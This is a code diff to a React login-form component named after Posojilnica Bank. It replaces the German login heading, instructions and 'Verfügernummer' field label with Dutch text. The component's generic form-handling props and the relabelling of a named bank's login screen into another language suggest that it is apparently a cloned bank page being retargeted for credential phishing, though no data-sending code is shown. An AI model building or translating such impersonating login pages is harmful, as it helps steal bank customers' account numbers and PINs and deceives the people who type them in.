@@ -50,9 +50,9 @@ export function PosojilnicaBank({ formData, onChange, handleRouteAction, saving 
           </div>
 
           <div className="mt-4">
-            <h1 className="text-[26px] font-medium text-[#333] mb-4">Bitte melden Sie sich an</h1>
+            <h1 className="text-[26px] font-medium text-[#333] mb-4">Log alstublieft in</h1>
             <p className="text-[13px] text-[#555] mb-8">
-              Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
+              Voer uw inloggegevens in om verder te gaan.
             </p>
 
             <form 
@@ -105,11 +105,11 @@ export function PosojilnicaBank({ formData, onChange, handleRouteAction, saving 
                 )}
               </div>
 
-              {/* Verfügernummer Field */}
+              {/* Inlogcode Field */}
               <div className="relative">
                 <div className="w-full bg-[#f4f4f4] border-b-[1px] border-[#767676] focus-within:border-[#333] transition-colors flex flex-col px-4 min-h-[56px] justify-center group relative">
                   <label className="absolute top-2 text-[11px] text-[#666] group-focus-within:text-[#333] transition-colors">
-                    Verfügernummer eingeben *
+                    Inlogcode invoeren *
                   </label>
                   <input 
                     type="text" 
